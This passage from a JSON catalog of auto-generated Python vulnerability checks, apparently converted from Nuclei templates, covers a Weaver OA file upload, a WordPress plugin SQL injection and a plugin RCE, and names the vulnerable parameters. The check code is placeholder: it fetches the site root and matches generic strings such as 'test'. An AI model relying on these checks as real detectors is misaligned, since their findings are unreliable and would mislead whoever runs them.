        "severity": "critical",
        "detection": "[AND] DSL: status_code_1 == 200 && contains(body_1,'workrelate/plan/util/ViewDoc'); status_code_2 == 200 && contains(body_2, 'println')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{randstr}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-uploadoperation-file-upload\nName: Weaver OA Workrelate - Arbitary File Upload\nSeverity: critical\nDescription: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_uploadoperation_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-uploadoperation-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver OA Workrelate - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200 && contains(body_1,'workrelate/plan/util/ViewDoc'); status_code_2 == 200 && contains(body_2, 'println')\"\n\n        # Simple word matcher simulation\n        matchers = ['workrelate/plan/util/ViewDoc', 'println']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver OA Workrelate - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_uploadoperation_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-uploadoperation-file-upload\nName: Weaver OA Workrelate - Arbitary File Upload\nSeverity: critical\nDescription: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_uploadoperation_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-uploadoperation-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver OA Workrelate - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200 && contains(body_1,'workrelate/plan/util/ViewDoc'); status_code_2 == 200 && contains(body_2, 'println')\"\n\n        # Simple word matcher simulation\n        matchers = ['workrelate/plan/util/ViewDoc', 'println']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver OA Workrelate - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_uploadoperation_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "ecology",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_advanced_booking_calendar_sqli",
        "name": "Advanced Booking Calendar < 1.6.2 - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users' hashed password, username and email address.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: advanced-booking-calendar-sqli\nName: Advanced Booking Calendar < 1.6.2 - SQL Injection\nSeverity: critical\nDescription: The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users' hashed password, username and email address.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_advanced_booking_calendar_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"advanced-booking-calendar-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Advanced Booking Calendar < 1.6.2 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Advanced Booking Calendar < 1.6.2 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_advanced_booking_calendar_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: advanced-booking-calendar-sqli\nName: Advanced Booking Calendar < 1.6.2 - SQL Injection\nSeverity: critical\nDescription: The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users' hashed password, username and email address.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_advanced_booking_calendar_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"advanced-booking-calendar-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Advanced Booking Calendar < 1.6.2 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Advanced Booking Calendar < 1.6.2 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_advanced_booking_calendar_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "sqli",
          "wpscan",
          "wordpress",
          "wp-plugin",
          "wp",
          "advanced-booking-calendar",
          "unauthenticated",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_blog_designer_pack_rce",
        "name": "News & Blog Designer Pack < 3.4.2 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.php. The vulnerability occurs within bdp_get_more_post function inside file bdp-ajax-functions.php.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body_1, \"\\\"success\\\":0\"); contains(body_2,\"channel pear.php.net\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "randomstr",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: randomstr",
            "default": "{{randstr_1}}"
          },
          {
            "name": "marker",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: marker",
            "default": "{{base64(randomstr)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: blog-designer-pack-rce\nName: News & Blog Designer Pack < 3.4.2 - Remote Code Execution\nSeverity: critical\nDescription: News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.php. The vulnerability occurs within bdp_get_more_post function inside file bdp-ajax-functions.php.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_blog_designer_pack_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"blog-designer-pack-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"News & Blog Designer Pack < 3.4.2 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_1, \"\\\\\"success\\\\\":0\"); contains(body_2,\"channel pear.php.net\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", 